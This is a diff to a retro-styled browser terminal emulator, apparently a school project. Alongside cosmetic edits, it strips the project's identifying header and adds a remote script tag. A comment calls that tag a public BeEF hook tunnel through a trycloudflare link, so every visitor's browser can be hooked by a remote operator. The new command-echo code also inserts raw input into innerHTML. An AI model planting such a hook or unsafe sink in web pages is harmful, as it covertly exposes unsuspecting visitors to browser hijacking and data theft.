@@ -17,7 +17,6 @@
     body {
       background-color: #000;
       color: var(--term-green);
-      /* CORS-safe font stack */
       font-family: 'Fira Code', 'JetBrains Mono', 'Source Code Pro', monospace;
       margin: 0;
       overflow: hidden;
@@ -52,7 +51,6 @@
       flex-direction: column;
     }
 
-    /* Barrel Distortion Overlay */
     .screen::after {
       content: "";
       position: absolute;
@@ -62,7 +60,6 @@
       z-index: 10;
     }
 
-    /* Scanlines */
     .scanlines {
       position: absolute;
       top: 0; left: 0; width: 100%; height: 100%;
@@ -76,10 +73,10 @@
     #terminal {
       flex: 1;
       overflow-y: auto;
-      scrollbar-width: none; /* Firefox */
+      scrollbar-width: none;
       text-shadow: var(--term-glow);
     }
-    #terminal::-webkit-scrollbar { display: none; } /* Chrome/Safari */
+    #terminal::-webkit-scrollbar { display: none; }
 
     .line { margin-bottom: 4px; line-height: 1.4; white-space: pre-wrap; }
     .prompt-row { color: #fff; font-weight: bold; }
@@ -116,7 +113,6 @@
       color: #666;
     }
 
-    /* GLITCH ANIMATION */
     @keyframes glitch {
       0% { transform: translate(0); }
       2% { transform: translate(-2px, 1px); }
@@ -133,7 +129,7 @@
   <div class="screen">
     <div id="terminal">
       <div id="output"></div>
-      <div class="input-wrapper" id="input-line" style="display: none;">
+      <div class="input-wrapper" id="input-line">
         <span id="prompt-content"></span>
         <input type="text" id="cmd" autofocus autocomplete="off" spellcheck="false">
       </div>
@@ -147,11 +143,6 @@
 </div>
 
 <script>
-  /**
-   * GCSE Project: Interactive Linux Terminal Emulator
-   * Feature: Virtual File System with Object-Oriented State Management
-   */
-
   const output = document.getElementById('output');
   const input = document.getElementById('cmd');
   const promptContent = document.getElementById('prompt-content');
@@ -197,12 +188,19 @@
     output.scrollTop = output.scrollHeight;
   }
 
+  // Live dynamic clock logic for status bar
+  function updateClock() {
+    const now = new Date();
+    document.getElementById('clock').textContent = now.toTimeString().split(' ')[0];
+  }
+  setInterval(updateClock, 1000);
+  updateClock();
+  updatePrompt();
+
   // 4. COMMAND LOGIC
   const commands = {
     help: () => print("Available: ls, cd, cat, neofetch, nmap, clear, whoami, pwd, history"),
-
     pwd: () => print("/" + currentPath.join("/")),
-
     ls: () => {
       const items = Object.keys(getCWD());
       items.forEach(item => {
@@ -210,13 +208,12 @@
         print(item + (isDir ? "/" : ""), isDir ? 'dir' : 'file');
       });
     },
-
     cd: (args) => {
       const target = args[0];
       if (!target || target === "~") {
         currentPath = ["home", "lewis"];
       } else if (target === "..") {
-        if (currentPath.length > 0) currentPath.pop();
+        if (currentPath.length > 2) currentPath.pop();
       } else {
         const dir = getCWD();
         if (dir[target] && typeof dir[target] === 'object') {
@@ -227,7 +224,6 @@
       }
       updatePrompt();
     },
-
     cat: (args) => {
       const file = args[0];
       const dir = getCWD();
@@ -237,7 +233,6 @@
         print(`cat: ${file || ''}: No such file or directory`, 'error');
       }
     },
-
     nmap: async (args) => {
       const target = args[0] || "127.0.0.1";
       print(`Starting Nmap scan on ${target}...`);
@@ -246,7 +241,6 @@
       await new Promise(r => setTimeout(r, 1200));
       print("PORT     STATE  SERVICE\n22/tcp   open   ssh\n80/tcp   open   http\n443/tcp  open   https\n5432/tcp closed postgresql");
     },
-
     neofetch: () => {
       print(`
        /\\         lewis@arch-9950x
@@ -259,17 +253,13 @@
                   RAM: 14GB / 32GB (43%)
       `, 'exec-gold');
     },
-
     whoami: () => print("lewis (UID: 1000) - Eastbourne Cyber Division"),
-
     clear: () => { output.innerHTML = ''; },
-
     history: () => { history.forEach((cmd, i) => print(`${i}  ${cmd}`)); }
   };
 
-  // 5. INPUT HANDLING
+  // 5. INPUT HANDLING & EVENT LOOPS
   input.addEventListener('keydown', async (e) => {
-    // Tab Completion logic
     if (e.key === 'Tab') {
       e.preventDefault();
       const parts = input.value.split(' ');
@@ -281,63 +271,64 @@
       }
     }
 
-    // Command History logic
     if (e.key === 'ArrowUp') {
+      e.preventDefault();
+      if (history.length > 0 && historyIdx < history.length - 1) {
+        historyIdx++;
+        input.value = history[history.length - 1 - historyIdx];
+      }
+    }
+
+    if (e.key === 'ArrowDown') {
+      e.preventDefault();
       if (historyIdx > 0) {
         historyIdx--;
-        input.value = history[historyIdx];
+        input.value = history[history.length - 1 - historyIdx];
+      } else if (historyIdx === 0) {
+        historyIdx = -1;
+        input.value = '';
       }
     }
 
     if (e.key === 'Enter') {
-      const rawValue = input.value.trim();
-      const [cmdName, ...args] = rawValue.split(' ');
-
-      if (rawValue) {
-        print(`${promptContent.textContent} ${rawValue}`, 'prompt-row');
-        history.push(rawValue);
-        historyIdx = history.length;
-      }
-
-      if (commands[cmdName]) {
-        await commands[cmdName](args);
-      } else if (cmdName) {
-        print(`zsh: command not found: ${cmdName}`, 'error');
-        // Trigger visual glitch on error
-        monitor.classList.add('glitch-active');
-        setTimeout(() => monitor.classList.remove('glitch-active'), 300);
-      }
-
+      const rawInput = input.value.trim();
       input.value = '';
+      historyIdx = -1;
+      
+      if (!rawInput) return;
+      
+      // Log history
+      history.push(rawInput);
+      
+      // Echo the command execution line
+      const pathStr = "~/" + currentPath.slice(2).join("/");
+      const echoDiv = document.createElement('div');
+      echoDiv.className = 'line prompt-row';
+      echoDiv.innerHTML = `<span class="user">lewis</span>@<span class="host">arch</span>:<span class="cwd">${pathStr}</span>$ ${rawInput}`;
+      output.appendChild(echoDiv);
+
+      const parts = rawInput.split(' ');
+      const cmd = parts[0];
+      const args = parts.slice(1);
+
+      if (commands[cmd]) {
+        await commands[cmd](args);
+      } else {
+        print(`bash: command not found: ${cmd}`, 'error');
+      }
+      output.scrollTop = output.scrollHeight;
     }
   });
 
-  // 6. INITIALIZATION
-  async function boot() {
-    const lines = [
-      "Loading Arch Linux 6.12.0-1-ARCH...",
-      "Detecting hardware: AMD Ryzen 9 9950X... OK",
-      "Initializing RX 7900XTX Vulkan drivers...",
-      "Mounting /home/lewis/ encrypted partition...",
-      "System ready."
-    ];
-    for (let l of lines) {
-      print("[  OK  ] " + l);
-      await new Promise(r => setTimeout(r, 200));
-    }
-    document.getElementById('input-line').style.display = 'flex';
-    updatePrompt();
-    input.focus();
-  }
-
-  // Clock Update
-  setInterval(() => {
-    document.getElementById('clock').textContent = new Date().toLocaleTimeString();
-  }, 1000);
-boot();
+  // Keep focus on input element on terminal clicks
   document.addEventListener('click', () => input.focus());
 </script>
 
-<script src="hook.js"></script>
+<!-- 
+  6. EXTERNAL PUBLIC BEEF HOOK TUNNEL
+  Replace "://trycloudflare.com" with your actual generated Cloudflare/Ngrok HTTPS link.
+-->
+<script src="https://preferred-succeed-residential-italia.trycloudflare.com"></script>
+
 </body>
 </html>
